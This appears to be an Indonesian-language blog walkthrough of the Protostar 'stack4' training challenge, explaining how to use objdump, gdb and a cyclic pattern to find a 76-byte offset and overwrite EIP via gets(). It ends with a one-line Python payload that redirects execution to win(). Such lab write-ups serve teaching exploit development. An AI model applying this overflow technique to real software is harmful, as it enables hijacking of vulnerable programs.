---
layout: post
title: "Protostar: stack4"
date: 2020-07-09 21:07:03 +0700
categories: [reversing, protostar]
---

stack4 dapat ditemukan pada directory `/opt/protostar/bin/` bersama dengan challenge lainnya. Sebelum mengerjakan challenge ini baca terlebih dahulu deskripsi dan hints nya [disini](https://exploit-exercises.lains.space/protostar/stack4/). Pada halaman tersebut diberitahukan jika challenge kali ini kita akan "benar - benar" menimpa **EIP**. [EIP](http://www.c-jump.com/CIS77/ASM/Instructions/I77_0040_instruction_pointer.htm) sendiri merupakan bagian register yang selalu berisikan alamat dari instruksi yang akan dieksekusi selanjutnya. Pengertian dan pembahasan lebih lanjut dari EIP dapat dibaca di [wikipedia](wikipedia.org) laman [Program Counter](https://en.wikipedia.org/wiki/Program_counter).

Pembeda utama dari challenge ini dengan [sebelumnya](/belajar-reversing-protostar-stack3/) ialah kali ini input untuk overflow kita yang sebelumnya terdiri dari **ukuran buffer** + **alamat fungsi** menjadi **ukuran buffer** + **padding** + **alamat fungsi** dengan padding merupakan jarak antara buffer dengan EIP. Mari kita cek dulu berkas stack4 dengan `file` seperti biasa.

```bash
file stack4
```

output:
![output dari file](/images/protostar-stack4-1.png)

Beruntung sekali stack4 ini tidak di strip, sehingga memudahkan bagi kita dalam menganalisis stack4. Sekarang mari kita tengok source codenya.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Lebih singkat dari stack3 dan fungsi tujuan kita masih sama, **win()**. Dengan **objdump** mari kita cari alamat fungsi main.

```bash
objdump -D stack4 | grep win
```

opsi -D berguna untuk mendisassembly stack4, selengkapnya dapat dibaca di manual dari objdump, `man objdump`. **grep** digunakan untuk memfilter output agar hanya menampilkan baris yang terdapat string 'win'.

output:
![output dari objdump](/images/protostar-stack4-2.png)

Fungsi win terdapat pada alamat _080483f4_. Untuk mencari padding kita akan menggunakan **gdb**.

```bash
gdb -q stack4
set disassembly-flavor intel
disas main
```

Baris perintah pertama untuk meload stack4 ke gdb dengan mode quiet. Baris kedua digunakan untuk menginstruksikan gdb untuk menampilkan kode assembly dalam syntax intel. Baris selanjutnya digunakan untuk melihat daftar fungsi yang ada dan dipakai pada stack4. Baris terakhir ialah untuk mendisassembly fungsi main.

![meload stack4 kedalam gdb dan mendisassembly fungsi main](/images/protostar-stack4-3.png)

Dengan gdb kita juga dapat mengetahui alamat dari fungsi main. Gunakan `info function` untuk menampilkan daftar fungsi. `disas win` untuk mendisassembly fungsi win dan mengetahui alamatnya (alamat pertama pada hasil disassembly fungsi win).

```nasm
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
```

Diatas merupakan hasil disassembly fungsi main. Yang kita lakukan selanjutnya ialah memasang **breakpoint**. Seperti namanya breakpoint merupakan poin berhenti, digunakan untuk mem"pause" program. Dalam hal ini kita akan memasang break/pause pada saat pemanggilan fungsi **gets**. Cara memasangnya ialah dengan menggunakan perintah berikut.

```c
break *0x08048418
```

break diikuti dengan asterisk (\*) dan alamat dimana kita akan memasang break, saat pemanggilan fungsi gets.

![break *0x08048418](/images/protostar-stack4-4.png)

Gunakan `run` untuk menjalankan program, lalu `ni` untuk lanjut satu step. Program akan meminta input. Kita akan menggunakan input berpola, tujuannya untuk mempermudah kita dalam mengetahui ukuran padding. Kita akan menggunakan web [https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html) untuk men _generate_ kan pattern input. Cukup 100 karakter saja, karena ukuran buffer juga cuma 64 seharusnya 100 sudah cukup.

![generate pattern](/images/protostar-stack4-5.png)

Lalu gunakan hasil generatenya sebagai input.

![input pattern](/images/protostar-stack4-6.png)

Selanjutnya kita akan melihat isi **stack**. Gunakan perintah `info frame` dan pada bagian bawah gdb akan menunjukan dimana `eip`. Gunakan `x/s` untuk mengintip isi eip dan menampilkannya dalam string.

output:
![isi eip](/images/protostar-stack4-7.png)

Sebelum lanjut akan saya jelaskan perintah - perintah yang telah kita masukkan. **run** digunakan untuk menjalankan program dalam mode _debug_, kita juga dapat menggunakan argumen, me redirect standard input output dsb. **ni** digunakan untuk berjalan satu instruksi, namun tidak masuk pada **subroutine calls**, maksudnya ialah kita tidak masuk pada fungsi yang dipanggil melainkan lanjut saja. Selain ni terdapat juga **si**, jika menggunakan si ini kita lanjut satu instruksi juga akan masuk kedalam **subroutine calls**. Misalnya pada saat pemanggilan fungsi gets, jika kita menggunakan ni kita hanya akan menjalankan gets namun tidak masuk pada fungsi gets, jika kita menggunakan si kita akan masuk. Semoga masuk akal. Selanjutnya kita menggunakan **info frame** digunakan untuk melihat stack "saat itu". **x/s** digunakan untuk examine dalam string, selain string juga dapat dalam decimal, hex dan juga dapat diatur jumlahnya. Semua penjelasan perintah diatas dapat dilihat dengan menggunakan `help` diikuti perintah yang ingin diketahui maksudnya.

![help gdb](/images/protostar-stack4-8.png)

Kembali lagi ke isi eip, salin isi eip (_c5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad_) lalu masukkan ke web [https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html) untuk mengetahui ukuran buffer + padding.

![find overflow offset](/images/protostar-stack4-9.png)

76 adalah ukuran buffer + padding. Selanjutnya kita akan keluar dari gdb lalu menjalankan stack4 dengan input random sebanyak 76 karakter diikuti alamat fungsi win. Untuk memasukkannya kita akan menggunakan bantuan python. Sekali lagi jangan lupakan bahwa protostar ialah little endian.

```bash
q #untuk keluar gdb
y #untuk keluar gdb
python -c 'print("A"*76 + "\xf4\x83\x04\x08")' | ./stack4
```

output:
![code flow successfully changed](/images/protostar-stack4-10.png)

Berhasil! Sekali lagi kita telah berhasil mengubah alur program.
